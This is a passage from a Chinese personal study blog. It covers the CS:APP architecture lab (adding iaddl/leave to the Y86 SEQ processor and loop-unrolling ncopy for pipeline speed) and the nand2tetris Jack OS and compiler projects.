<h2 id="partb"><a href="#partb" class="headerlink" title="partb"></a>partb</h2><p>Your task in Part B is to extend the SEQ processor to support the iaddq, described in Homework problems<br>4.51 and 4.52. To add this instructions, you will modify the file seq-full.hcl, which implements the<br>version of SEQ described in the CS:APP3e textbook. In addition, it contains declarations of some constants<br>that you will need for your solution.<br>这部分需要你在<code>seq</code>处理器中实现<code>leave</code>和<code>iaddl</code>指令。我们知道按照<code>seq</code>的指令执行过程一般分为:<br><code>fetch</code>,<code>decode</code>,<code>Execute</code>,<code>Memory</code>,<code>Write back</code>,<code>PC update</code>等几个阶段，每个阶段都需要设置不同的标志位。因为在<code>y86</code>的指令集中为变长指令，所有的指令集都可可能是</p>
<h3 id="iaddl"><a href="#iaddl" class="headerlink" title="iaddl"></a>iaddl</h3><ul>
<li><code>iaddl</code>指令：即实现立即数与寄存器的值进行相加，结果存储在寄存器中。指令形式如下：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iaddl C,rB</span><br><span class="line">rB = C + rB</span><br></pre></td></tr></table></figure>
指令的翻译过程为:<table>
<thead>
<tr>
<th>stage</th>
<th>iaddl V,rB</th>
</tr>
</thead>
<tbody><tr>
<td>fetch</td>
<td>icode:ifun ← M1[PC]<br>rA:rB ← M1[PC + 1] <br>valC ← M4[PC + 2]<br>valP ← PC + 6</td>
</tr>
<tr>
<td>decode</td>
<td>valB ← R[rb]</td>
</tr>
<tr>
<td>Execute</td>
<td>valE ← valC + valB</td>
</tr>
<tr>
<td>Memory</td>
<td></td>
</tr>
<tr>
<td>Write back</td>
<td>r[rb] ← valE</td>
</tr>
<tr>
<td>PC update</td>
<td>PC ← valP</td>
</tr>
</tbody></table>
</li>
</ul>
<h3 id="leave"><a href="#leave" class="headerlink" title="leave:"></a>leave:</h3><ul>
<li><code>leave</code>指令的翻译就较为复杂，首先我们来看一下<code>leave</code>指令的实际执行过程<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">movl %ebp,%esp</span><br><span class="line">popl %ebp</span><br></pre></td></tr></table></figure>
首先将当前的基值寄存器中的值写入到栈寄存器，然后将栈顶的数据写入到基质寄存器中，然后栈寄存器加<code>4</code>，实际我们可以如下翻译:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%ebp_new = (%esp_odd)</span><br><span class="line">%esp_new = %esp_odd + 4</span><br></pre></td></tr></table></figure>
指令的翻译过程为:<table>
<thead>
<tr>
<th>stage</th>
<th>leave</th>
</tr>
</thead>
<tbody><tr>
<td>fetch</td>
<td>icode:ifun ← M1[PC]<br>valP ← PC + 1</td>
</tr>
<tr>
<td>decode</td>
<td>valA ← R[%esp]</td>
</tr>
<tr>
<td>Execute</td>
<td>valE ← 4 + valA</td>
</tr>
<tr>
<td>Memory</td>
<td>valM ← M4[valA]</td>
</tr>
<tr>
<td>Write back</td>
<td>R[%esp] ← valE<br>R[%ebp] ← valM</td>
</tr>
<tr>
<td>PC update</td>
<td>PC ← valP</td>
</tr>
<tr>
<td>即将当前基址寄存器中的数据写入到栈寄存器中，感觉还是挺不容易理解的，对于指令的翻译过程其实蛮有意思的，需要对<code>HCL</code>语言有基本的熟悉过程即可。就是几个阶段的数据要弄清楚即可，必须寻址阶段的地址非常有必要的学习，还有<code>ALU</code>的使用，写会操作等等。</td>
<td></td>
</tr>
</tbody></table>
</li>
</ul>
<h2 id="partc"><a href="#partc" class="headerlink" title="partc"></a>partc</h2><p>You will be working in directory sim&#x2F;pipe in this part.<br>The ncopy function in Figure 2 copies a len-element integer array src to a non-overlapping dst, returning a count of the number of positive integers contained in src. Figure 3 shows the baseline Y86-64<br>version of ncopy. The file pipe-full.hcl contains a copy of the HCL code for PIPE, along with a<br>declaration of the constant value IIADDQ.<br>Your task in Part C is to modify ncopy.ys and pipe-full.hcl with the goal of making ncopy.ys<br>run as fast as possible.<br>You will be handing in two files: pipe-full.hcl and ncopy.ys. Each file should begin with a header<br><code>partc</code>部分需要对<code>ncopy</code>这段程序翻译后的汇编程序进行流水线优化，从而达到加速效果。根据提示，主要优化方法为将循环进行展开，命令即可进行流水线化，从而节省运行时间。目前对于这个程序主要有两部分可以进行优化，一是尽量避免流水线的数据冒险和控制冒险，二是尽量对循环进行展开，从而可以优化指令，减少运行的指令数。本章对于流水线的深度部分讲的原理还是非常深刻的，特别是对于流水线的运行以及加速原理讲的非常浅显易懂，如因为自己并不是处理器架构方面的资深工程师，对这一部分还是有许多很模糊的概念需要弄明白。</p>
<ul>
<li>流水线的基本原理：常规的运行模式我们称之为<code>RTC</code>模式(run to complete)，即从头开始执行到尾然后再开始下一条指令的执行。经典的<code>rtc</code>模式即每条指令执行完成上述的五个阶段<code>fetch、decode、Execute、Memory、Write back</code>之后,跟新<code>pc</code>后，<code>cpu</code>再开始执行下一条指令。因此每条指令需要等待前一条指令的五个阶段全部执行完成后，才开始进入<code>fetch</code>阶段，而流水线的原理则是利用缓存，每个阶段的计算结果完成后先进入缓冲区，再由缓冲区送入到下一个阶段，这样每当当前的<code>stage</code>的结果送入缓存后，我们即可将下一条指令送入到本次的<code>stage</code>中,具体的每个<code>stage</code>的详细处理细节可以参考章节<code>4.3.4</code>。<br>RTC模式：<br><img src="https://i.loli.net/2021/02/17/RuCqaGJYIUv4ntE.jpg"><br>Pipeline模式:<br>通过在每个stage处都加入缓存即可实现流水线，因为有缓存的存在，此时我们可以将上一个<code>stage</code>的结果临时存放在缓存中，此时当前的<code>stage</code>即可进行下一条指令，待后一个<code>stage</code>完成后，我们将其从缓存中取出临时结果放入到下一个<code>stage</code>中。如果需要实现<code>pipeline</code>则缓存一定是必须的。<br><img src="https://i.loli.net/2021/02/17/D42VmicUvkaqeX7.jpg"><br><img src="https://i.loli.net/2021/02/17/rj5STc6HEfYmq3v.png"></li>
<li>流水的加速比的计算：假设每条指令几个阶段<code>fetch、decode、Execute、Memory、Write back</code>的耗时分别为$t_{0},t_{1},t_{2},t_{3},t_{4}$,则执行一条完整的指令的执行时间为:<br>$$<br>T &#x3D; t_{0} + t_{1} + t_{2} + t_{3} + t_{4} &#x3D; \sum_{i&#x3D;0}^{n}t_{i}<br>$$<br>如果按照<code>rtc</code>模式的执行的话，如果执行<code>n</code>条指令则需要的总时间为$t &#x3D; N<em>T$，如果采用流水线时，则如果执行<code>N</code>条指令则需要的总时间约为:<br>$$<br>t &#x3D; (n</em>t_{max}) + (N-1)<em>t_{max}<br>$$<br>其中<code>n</code>代表此流水线有<code>n</code>个<code>stage</code>,$t_{max}$代表<code>n</code>个<code>stage</code>中耗时最长的<code>stage</code>.<br>则加速比的计算公式为:<br>$$<br>S &#x3D; \frac{t_{rtc}}{t_{pipeline}} &#x3D; \frac{(n</em>t_{max}) + (N-1)<em>t_{max}}{N</em>\sum_{i&#x3D;0}^{n}t_{i}}<br>$$<br><img src="https://i.loli.net/2021/02/17/vBbzhYdHaOFiWge.png"></li>
<li>流水线的数据冒险：在流水线的实际运行中某些关联指令可能存在问题，比如下一条指令必须用到上一条指令的运算结果，则此时就出现了数据错误，因为下一条指令在<code>decode</code>阶段时，可能某个寄存器的值还没有在上一个指令中完成更新，则此时计算时肯定存在错误。比如执行以下指令时，如果严格按照执行<code>rrmoveq</code>指令时，此时可能<code>rdx</code>寄存器还未完成跟新，因为第三条在执行<code>decode</code>阶段时，此时第二条指令还在<code>excute</code>阶段，还未到<code>写回</code>阶段，则此时直接读取<code>%rdx</code>寄存器时的值可能是未知的，因此这就意味着风险，此时我们必须将流水线暂停几个<code>stage</code>等待寄存器<code>%rdx</code>完成更新后，我们再执行第三条指令。<br><img src="https://i.loli.net/2021/02/17/v2YHpi4lb9V15rI.png"><br>则此时我们需要插入两个空指令等待第二条指令完成<code>写回</code>阶段后，我们即可进行<code>decode</code>阶段。<br><img src="https://i.loli.net/2021/02/17/TtlyzMXK5LJBZsI.png"></li>
<li>流水线的控制冒险：我们知道正常的指令跳转地址为该指令执行完成后，紧挨着的下一条指令，一般情况下我们在取指令阶段即同时预先完成下一条指令地址的更新，但是由于部分指令中存在条件跳转指令，则此时之前在<code>fectch</code>阶段更新的指令地址可能会失效，我们此时就需要重新填入更新的指令地址，则此时我们需要进行指令取消，即在流水线中中止此时已经执行的指令。<br><img src="https://i.loli.net/2021/02/17/o4X2AfaFgLl9Q3w.png"></li>
</ul>
<h3 id="unrolling-loop"><a href="#unrolling-loop" class="headerlink" title="unrolling loop"></a>unrolling loop</h3><p>我们可以参考第<code>5</code>章的优化技术，即对循环进行展开，循环展开的好处有两点，一是可以充分的利用<code>cache</code>，另一方面可以有效的避免数据冒险，即相邻的指令使用同一个寄存器。<br>对于<code>partc</code>部分，主要针对原有的程序进行了如下优化：</p>
<ol>
<li>对于循环进行展开，每次我们每次读取<code>4</code>个字节，对每个字节进行分别读取和转存，同时尽可能的避免相邻的指令读取和存储同一个寄存器，从而避免气泡和空指令，从而来加速流水线的执行，由于本课程的工具的限制，本来有<code>15</code>个通用的寄存器，但是不知道为什么它提供的工具竟然不允许用<code>%r8~%r14</code>这<code>5</code>个寄存器。</li>
<li>使用<code>partb</code>部分的<code>iaddl</code>指令，即可以用一条指令完成之前用三条指令实现。</li>
<li>感觉本章的许多细节部分还是糊里糊涂，不是特别清楚，只能等待后续有实际的应用场景后再结合实际来研究细节的话，效果才能更好。<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">##################################################################</span><br><span class="line"><span class="meta"># ncopy.ys - Copy a src block of len ints to dst.</span></span><br><span class="line"># <span class="function">Return the number of positive <span class="title">ints</span> <span class="params">(&gt;<span class="number">0</span>)</span> contained in src.</span></span><br><span class="line"><span class="function">#</span></span><br><span class="line"><span class="function"># Include your name <span class="keyword">and</span> ID here.</span></span><br><span class="line"><span class="function">#</span></span><br><span class="line"><span class="function"># Describe how <span class="keyword">and</span> why you modified the baseline code.</span></span><br><span class="line"><span class="function">#</span></span><br><span class="line"><span class="function">##################################################################</span></span><br><span class="line"><span class="function"># Do <span class="keyword">not</span> modify <span class="keyword">this</span> portion</span></span><br><span class="line"><span class="function"># Function prologue.</span></span><br><span class="line"><span class="function">ncopy:	pushl %ebp		# Save old frame pointer</span></span><br><span class="line"><span class="function">	rrmovl %esp,%ebp	# Set up new frame pointer</span></span><br><span class="line"><span class="function">	pushl %esi		# Save callee-save regs</span></span><br><span class="line"><span class="function">	pushl %ebx</span></span><br><span class="line"><span class="function">	pushl %edi</span></span><br><span class="line"><span class="function">	mrmovl <span class="number">8</span>(%ebp),%ebx	# src</span></span><br><span class="line"><span class="function">	mrmovl <span class="number">16</span>(%ebp),%edx	# len</span></span><br><span class="line"><span class="function">	mrmovl <span class="number">12</span>(%ebp),%ecx	# dst</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">##################################################################</span></span><br><span class="line"><span class="function"># You can modify this portion</span></span><br><span class="line"><span class="function"># Loop header</span></span><br><span class="line"><span class="function">	xorl %eax,%eax		# count =</span> <span class="number">0</span>;</span><br><span class="line">	iaddl $<span class="number">-4</span> , %edx      <span class="meta"># len = len - 4</span></span><br><span class="line">	andl %edx,%edx		<span class="meta"># len &lt;= 0?</span></span><br><span class="line">	jle Remain		    <span class="meta"># <span class="keyword">if</span> so, goto Done:</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># loop unrolling </span></span><br><span class="line">Loop:  </span><br><span class="line">	<span class="built_in">mrmovl</span> (%ebx),%esi      <span class="meta"># read val from src</span></span><br><span class="line">	mrmovl <span class="number">4</span>(%ebx), %edi    <span class="meta"># read val from src</span></span><br><span class="line">	rmmovl %esi, (%ecx)	# ...<span class="keyword">and</span> store it to dst</span><br><span class="line">	andl %esi, %esi</span><br><span class="line">	jle Nop1</span><br><span class="line">	iaddl  $<span class="number">1</span>, %eax         <span class="meta"># count = count + 1</span></span><br><span class="line">Nop1:</span><br><span class="line">	rmmovl %edi, <span class="number">4</span>(%ecx)	# ...<span class="keyword">and</span> store it to dst</span><br><span class="line">	andl %edi, %edi</span><br><span class="line">	jle Nop2</span><br><span class="line">	iaddl  $<span class="number">1</span>, %eax         <span class="meta"># count = count + 1</span></span><br><span class="line">Nop2:</span><br><span class="line">	iaddl  $<span class="number">-4</span>, %edx        <span class="meta"># len = len - 4</span></span><br><span class="line">	mrmovl <span class="number">8</span>(%ebx),%esi      <span class="meta"># read val from src</span></span><br><span class="line">	mrmovl <span class="number">12</span>(%ebx), %edi    <span class="meta"># read val from src</span></span><br><span class="line">	rmmovl %esi, <span class="number">8</span>(%ecx)	# ...<span class="keyword">and</span> store it to dst</span><br><span class="line">	andl %esi, %esi</span><br><span class="line">	jle Nop3</span><br><span class="line">	iaddl  $<span class="number">1</span>, %eax         <span class="meta"># count = count + 1</span></span><br><span class="line">Nop3:</span><br><span class="line">	rmmovl %edi, <span class="number">12</span>(%ecx)	# ...<span class="keyword">and</span> store it to dst</span><br><span class="line">	andl %edi, %edi</span><br><span class="line">	jle Nop4</span><br><span class="line">	iaddl  $<span class="number">1</span>, %eax         <span class="meta"># count = count + 1</span></span><br><span class="line">Nop4:</span><br><span class="line">	iaddl  $<span class="number">16</span>, %ebx</span><br><span class="line">	iaddl  $<span class="number">16</span>, %ecx</span><br><span class="line">	andl   %edx,%edx        <span class="meta"># len &gt; 0 ? </span></span><br><span class="line">	jg Loop			<span class="meta"># <span class="keyword">if</span> so, goto Loop:</span></span><br><span class="line"></span><br><span class="line">###############<span class="meta">#left element######################################</span></span><br><span class="line">Remain:</span><br><span class="line">	iaddl  $<span class="number">4</span>, %edx</span><br><span class="line">	andl  %edx,%edx</span><br><span class="line">	jle   Done</span><br><span class="line">Nxloop:</span><br><span class="line">	<span class="built_in">mrmovl</span> (%ebx),%esi      <span class="meta"># read val from src</span></span><br><span class="line">	iaddl $<span class="number">4</span>,%ebx</span><br><span class="line">	iaddl $<span class="number">-1</span>,%edx</span><br><span class="line">	rmmovl %esi, (%ecx)	# ...<span class="keyword">and</span> store it to dst</span><br><span class="line">	iaddl $<span class="number">4</span>,%ecx</span><br><span class="line">	andl %esi, %esi</span><br><span class="line">	jle Nop5</span><br><span class="line">	iaddl  $<span class="number">1</span>, %eax         <span class="meta"># count = count + 1</span></span><br><span class="line">Nop5:	</span><br><span class="line">	andl  %edx,%edx</span><br><span class="line">	jg Nxloop</span><br><span class="line">	</span><br><span class="line">##################################################################</span><br><span class="line"># Do <span class="keyword">not</span> modify the following section of code</span><br><span class="line"># Function epilogue.</span><br><span class="line">Done:</span><br><span class="line">	popl %edi               # Restore callee-save registers</span><br><span class="line">	popl %ebx</span><br><span class="line">	popl %esi</span><br><span class="line">	rrmovl %ebp, %esp</span><br><span class="line">	popl %ebp</span><br><span class="line">	ret</span><br><span class="line">##################################################################</span><br><span class="line"># Keep the following label at the end of your function</span><br><span class="line">End:</span><br><span class="line"># <span class="comment">/* $end ncopy-ys */</span></span><br></pre></td></tr></table></figure>
最终的运行的<code>bechmark</code>的结果<code>CPE</code>竟然为<code>1.41</code>，感觉不可思议，应该还是部分地方处理有点问题，不过最终的细节还需要后面仔细的考虑和学习，部分细节也没有更多的时间去思考了，不过由于本身自己并不是做处理器加速的，这块的理论需要很深厚的理论基础，当然作为科普了解一下基本的内容和原理来说还是非常不错的。<br><img src="https://i.loli.net/2021/02/17/TjHPEe7ftI5dr4x.png"><br>欢迎关注和打赏，感谢支持！</li>
</ol>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>CSAPP</category>
      </categories>
      <tags>
        <tag>公开课学习</tag>
      </tags>
  </entry>
  <entry>
    <title>【build a computer】 project 12</title>
    <url>/2022/11/20/%E5%85%AC%E5%BC%80%E8%AF%BE%E5%AD%A6%E4%B9%A0/75/</url>
    <content><![CDATA[<h1 id="build-a-computer-week-12"><a href="#build-a-computer-week-12" class="headerlink" title="build a computer week 12"></a>build a computer week 12</h1><p>终于完成了<code>build a computer</code>系列的最后几章了，最终所有的<code>project</code>全部都通过了。<br><img src="https://i.loli.net/2021/01/28/CnAQqULTpxglm31.png"><br>真心感觉这个过程比较艰难，这个<code>project</code>是该系列课程里面最后的一个<code>toy project</code>了，主要部分为一个非常简单的<code>OS</code>系统的源代码的实现，其实代码实现并不难，因为大部分算法都可以在网上找到，但是细节处理非常容易出错，写代码很爽，也就3天的时间完成了大概也就将近<code>1000</code>行的代码，但是调试确实花了非常多的时间来完成，主要是因为部分细节确实实现比较坑爹，不太好弄，但是终于还是调通和实现了，感觉这种业务代码的实现也就是搬砖的活，还是写算法，刷题来的爽，因为算法的大部分问题思考的时间很多，写代码实际上非常容易实现，现在越来越喜欢类似的深度思考，需要花时间来解决的数学和技术难题，而不是拼命搬砖。所有的实现代码最终放在<code>github</code>上，<a href="">p12-jackos</a>.<br>终于完成全部的<code>build a modern computer</code>系列课程了，课程真的是太有趣了，我想做事有始有终，以前给自己定的<code>flag</code>是一定要完成这个课程，陆陆续续刷了大概有<code>6</code>个月的时间，才把整个系列的<code>part1,part2</code>课程完成了。本课程最有意思的是该课程讲出了计算机模型的本质，非常推荐国外这种化繁为简的教育理念和教育方法，通过现象可以看到本质，只需要实现最基本的<code>OS</code>的核心，非常低的门槛就可以将学生代入计算机的伟大世界中，了解计算的本质和基本原理，真心替两位教授点赞，看到资料介绍，本课程陆陆续续开发了近五年才最终完成了如此精品的课程。我想兴趣才是最好的老师，虽然学习这门课程花了很大的精力和很多的时间，但是学习完成之后，仍然会对本课程回味许多。</p>
<h2 id="project"><a href="#project" class="headerlink" title="project"></a>project</h2><p>本章节的<code>project</code>主要是实现操作系统的部分核心内容，俗称造轮子。本次需要造的轮子如下：</p>
<ul>
<li><code>Math</code>:数学计算部分，包含最基本的乘法，除法，开方，乘方，取模运算等;</li>
<li><code>String</code>: 字符串部分，主要包括字符类的基本功能，字符串转换，等等基本操作;</li>
<li><code>Array</code>: 数组的管理，数组的管理，主要包括数组构造和删除；</li>
<li><code>Output</code>: 字符或者数字的输出模块；</li>
<li><code>Screen</code>: 最基本的图形显示部分，包含最基本的图形显示部分，比如像素、直线、圆、矩形的显示；</li>
<li><code>Keyboard</code>:键盘的输入读取控制。</li>
<li><code>Memory</code>: 基本的内存管理部分。</li>
<li><code>Sys</code>：系统管理，包括系统的初始化和完成。<br><img src="https://i.loli.net/2021/01/28/mfrJ7Wb1PyUiIq9.png"></li>
</ul>
<h3 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h3><p>整个<code>math</code>部分完成了乘法、除法、开方、乘方、取模、取绝对值运算，其中最难的还是乘法和除法以及开方的实现。<br><img src="https://i.loli.net/2021/01/28/vyblfnmK31guXMx.png"></p>
<ol>
<li><code>multiply</code>:乘法利用了二进位的特定来进行实现，实现其实比较简单，算法时间复杂度为$O(lgn)$，每次测试二进制位<code>i</code>是否为<code>1</code>，如果为<code>1</code>，则减去相应的值即可，利用位运算非常容易实现。<br><img src="https://i.loli.net/2021/01/28/cpmYKZBMQbFkiEn.png"></li>
<li><code>divide</code>: 除法部分稍微复杂点，我们提前减去利用算法的特性实现即可，时间复杂度为$O(lgn)$.<br><img src="https://i.loli.net/2021/01/28/ToXsZj1rQmayYvi.png"></li>
<li><code>sqrt</code>: 开方的实现方法有很多种，这个实现思路就很多了，最简单的利用二分查找实现即可，还可以利用牛顿法，或者逼近法，课程中给出的解法则利用左右边界的逼近法。<br>$$<br>y^{2} \le x \le (y+1)^{2}<br>$$</li>
</ol>
<h3 id="Memory"><a href="#Memory" class="headerlink" title="Memory"></a>Memory</h3><p>本节实现了非常简单的内存管理模块，堆的管理实现比较简单，也没有太大的难度，常见的两种办法为<code>first fit</code>和<code>best fit</code>,关于具体的内存管理的实现算法有许多成熟的论文或者开源的代码可以参考，不过基本上也没有什么太大的难度。在本章中是实现了简单的<code>first fit</code>算法，简单的链表实现即可，对于老鸟来说非常简单的实现，当然对于快速的缓存来说一般都是采用将内存划分为固定字节的块，避免繁琐的查找。<br><img src="https://i.loli.net/2021/01/28/1rsp7wxVLHeylhz.png"><br><img src="https://i.loli.net/2021/01/28/kh9UtOiQRc6uvSB.png"></p>
<h3 id="Screen"><a href="#Screen" class="headerlink" title="Screen"></a>Screen</h3><p>该小节实现了基本的图形显示界面的实现，比如实现了最基本的矩形，圆形，点，直线的代码实现。<br><img src="https://i.loli.net/2021/01/28/h4vZjAI1onYqGwx.png"></p>
<ul>
<li><code>pixel</code>:对于点的实现比较简单，由于内存的字长为<code>16</code>位，我们直接采用<code>16</code>位掩码的方式，来快速的对显存部分实现读取和写入。</li>
<li><code>line</code>：<code>line</code>的部分就实现稍微复杂点，如果我们直接利用求斜率的方法则需要用到除法和乘法，非常耗时。在此利用加法和减法来实现快速的判别实现直线的点的计算。当然实现的过程中我们需要将直线分为3中类型，</li>
<li><ul>
<li>水平直线：即与<code>x</code>轴平行的直线，此时我们即可以快速的利用显存的<code>16</code>位带宽，一次性可以写入连续的<code>16</code>位，来加速写入显存的速率。</li>
</ul>
</li>
<li><ul>
<li>垂直直线: 此时的无法计算斜率，但是我们只需要连续填入即可，利用基本的几何知识即可实现。</li>
</ul>
</li>
<li><ul>
<li>普通直线: 我们则利用如下算法来实现相关代码，非常巧妙的加减法判断即可。<br><img src="https://i.loli.net/2021/01/28/YHGrcOXL9e6Iu4T.png"></li>
</ul>
</li>
<li><code>rectangle</code>:此时我们则利用画水平线的方式，快速的实现即可。</li>
<li><code>circle</code>:画圆的方式则比较容易实现，就是快速的画水平直线即可,当然如下的算法可以稍微改进一下，每次画两条直线，即可减少开方的计算，毕竟开方的计算非常耗时。<br><img src="https://i.loli.net/2021/01/28/HuoG85sIwB1qbWJ.png"></li>
</ul>
<h3 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h3><p>输出部分主要为整个系统的字符输出和显示。整个系统中给所有的字符完成一种最基本的字符定义和类型，从中我们可以窥探到字符集的实现。本质为我们将每一种字符都进行位图编辑，每次输出字符时，我们显示该字符的实际的位图即可，这个起始非常容易实现。<br><img src="https://i.loli.net/2021/01/28/NwFfqjALMDPCeiT.png"></p>
<ul>
<li><code>printChar</code>：打印字符的实现，所有的字符都采用<code>11x8</code>的位图来实现，因此非常的简单。我们每次输出字符时只需要定位到相应的起始位置，在显存中写入该字符的位图即可。</li>
<li><code>printInt</code>:这个即将整形转换为字符串，然后再输出即可，比较麻烦的地方是处理负数的问题。</li>
</ul>
<h3 id="Keyboard"><a href="#Keyboard" class="headerlink" title="Keyboard"></a>Keyboard</h3><p>读取和控制键盘，对键盘的输入进行读取和显示，这部分的实现起始非常简单，从键盘的<code>i/o</code>地址出，读取写入的字符然后显示相应的字符即可。<br><img src="https://i.loli.net/2021/01/28/gbOKMwFhPq5a1G3.png"></p>
<ul>
<li><code>keypressed</code>：从键盘读取一个输入字符，判断读取的循环即可<br><img src="https://i.loli.net/2021/01/28/ksChF6jzmga7V9S.png"></li>
</ul>
<h3 id="String"><a href="#String" class="headerlink" title="String"></a>String</h3><p><code>string</code>的处理则非常简单，因为只需要基本的函数即可，没啥太大难度，也没有多少难点需要阐述的。<br><img src="https://i.loli.net/2021/01/28/dsfGmeUJn6jvxlO.png"></p>
<h3 id="Array"><a href="#Array" class="headerlink" title="Array"></a>Array</h3><p><code>array</code>部分就更简单了，申请<code>size</code>长度的数组即为从堆中申请相应长度的空间即可。<br><img src="https://i.loli.net/2021/01/28/CYkLzUNxcr9fVQ5.png"></p>
<h3 id="Sys"><a href="#Sys" class="headerlink" title="Sys"></a>Sys</h3><p><code>sys</code>系统部分，主要重点需要注意的为系统初始化部分，题目中给的完全可能是错误的，首先第一个需要初始化的应该是<code>memory</code>部分，因为其他模块都可能需要用到<code>memory</code>部分的功能。具体的初始流程如下即可：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function void init() &#123;</span><br><span class="line">    do Memory.init();</span><br><span class="line">    do Math.init();</span><br><span class="line">    do Screen.init();</span><br><span class="line">    do Output.init();</span><br><span class="line">    do Keyboard.init();</span><br><span class="line">    do Main.main();</span><br><span class="line">    do Sys.halt();</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>起始总的来说，这个<code>project</code>相比其他几个<code>project</code>都容易许多，但是许多需要注意的细节：</p>
<ul>
<li>对于数学的部分：这部分需要非常快速的效率来实现，所以非常需要快的数学方法来化简直接的方法，从而提高效率，否则后续容易出现程序执行效率不高的问题。</li>
<li>对于图形部分的实现，如何继续改进则需要仔细的思考，特别是圆形的实现还需要非常多的优化。</li>
<li>其余的部分感觉基本上就是<code>cround</code>，没有特别多的理论需要思考和实现的。</li>
</ul>
<h2 id="project-1"><a href="#project-1" class="headerlink" title="project"></a>project</h2><p>本周的<code>project</code>感觉还是非常复杂的<code>project</code>，虽然很简单，但是要不出错还是需要非常注意细节的实现。<br>代码实现：<a href="https://github.com/mike-box/coursera/tree/master/Build%20a%20computer/nand2tetris/nand2tetris/projects/12">poj12</a>.</p>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>build a computer</category>
      </categories>
      <tags>
        <tag>公开课学习</tag>
      </tags>
  </entry>
  <entry>
    <title>【build a computer】 project 11</title>
    <url>/2022/11/20/%E5%85%AC%E5%BC%80%E8%AF%BE%E5%AD%A6%E4%B9%A0/77/</url>
    <content><![CDATA[<h1 id="week-11"><a href="#week-11" class="headerlink" title="week 11"></a>week 11</h1><p>目前已经开始了<code>build a computer</code>系列的最后几章了，后面的章节感觉越来越难,中间无数次感觉头大，不想再写这么恶心的程序了，还好坚持了下来，最终完整的通过了测试。这个<code>project</code>是该系列课程里面最难的一个<code>toy project</code>了，总共写了差不多快<code>2000</code>行代码，这个还是用<code>python</code>写的，当然代码写的一团狗屎，一个函数都差不多几百行了，全部是<code>cound</code>,代码水平还是稀烂，需要好好的学习一下设计模式。刚开始还好，写着写着就变味了。需要认真的设计程序结构，则需要好好花心思将整个代码重新设计一下，将所有的结构全部重新理顺一遍，整个编译器的设计还是非常有意思的，通过这个简易的编译器，可以对<code>stack machine</code>的设计有了初步的了解，也对面向对象语言的原理有了基本的了解。<br>完成该<code>project</code>的资源非常少，最终在<code>github</code>上找到了一个资源<a href="https://github.com/idelvall/jack-compiler">jack-compiler</a>，这个国外的小哥代码写得非常漂亮，值得仔细学习一下，还剩下最后一个<code>project</code>就终于可以完成全部的<code>build a modern computer</code>系列课程了，课程真的是太有趣了，最有意思的是该课程讲出了计算机模型的本质，非常的推荐。</p>
<h2 id="probelm"><a href="#probelm" class="headerlink" title="probelm"></a>probelm</h2><h3 id="Data-Translation"><a href="#Data-Translation" class="headerlink" title="Data Translation"></a>Data Translation</h3><p>变量处理。在整个<code>jack</code>程序中，变量类型一种分为四种:</p>
<ul>
<li><code>static</code>:静态变量，实际存方在<code>static segment</code>中。</li>
<li><code>argument</code>: 函数调用过程中的参数，每次调用函数时，需要指明传递的参数的个数，实际存放在<code>stack</code>中。</li>
<li><code>field</code>: 类的成员变量，实际存放在<code>heap</code>中。</li>
<li><code>local</code>：函数里面的过程变量，实际存在<code>stack</code>中。<br>在做实际的解析时，需要根据不同的类型，从而将相关的数据存放在不同的区域。</li>
</ul>
<h3 id="symbol-table"><a href="#symbol-table" class="headerlink" title="symbol table"></a>symbol table</h3><p>符号表每一行主要存放如下：</p>
<ul>
<li><code>varname</code>:变量的名称，实际变量的名称比如<code> var int a = 0</code>, 符号<code>a</code>即代表变量的名称。</li>
<li><code>vartype</code>：变量的类型，实际变量的类型比如<code> var int a = 0</code>, 符号<code>int</code>即代表变量的类型。</li>
<li><code>varkind</code>:变量的种类，即<code>static,argument,field,local</code>四种的一种。</li>
<li><code>varidx</code>：变量的索引，实际可以作为变量存放的偏移位置。</li>
</ul>
<p>在<code>jack compiler</code>中，编译器中的符号表分类两类：</p>
<ul>
<li><code>class</code>符号表: 主要存放类的成员变量的映射符号表，该符号表生命周期在编译过程中一直存在。</li>
<li><code>local</code>符号表: 主要存放函数调用过程中的映射符号表，该符号表仅在函数编译过程中存在。每一个函数会重新生成新的符号表。</li>
</ul>
<h3 id="Handling-Variables"><a href="#Handling-Variables" class="headerlink" title="Handling Variables"></a>Handling Variables</h3><p>所有的变量处理全部用符号表来处理，所有的变量定义和函数的形参全部需要传入到符号表中，在特定的调用时，查找符号表，即可快速的定位到变量的存储位置，从而实现变量的内存读写。</p>
<h3 id="Handling-Arrays"><a href="#Handling-Arrays" class="headerlink" title="Handling Arrays"></a>Handling Arrays</h3><p>我觉整个<code>jack</code>语言最有趣的就是处理数组和对象了。在这里它就用到了<code>c</code>语言指针的模型，因为<code>jack</code>语言本身有两个寄存器专门做为间接寻址的寄存器，所以我们每次只需要将数组的地址写入到间接寻址的寄存器即可，原理看似复杂实际非常的简单，处理数组时我们专用<code>pointer 1</code>寄存器。</p>
<ul>
<li><code>pop</code>操作: 直接将栈顶的数据写入到特定的地址。</li>
<li><code>push</code>操作：直接将地址中存放的变量读取到堆栈中即可。</li>
</ul>
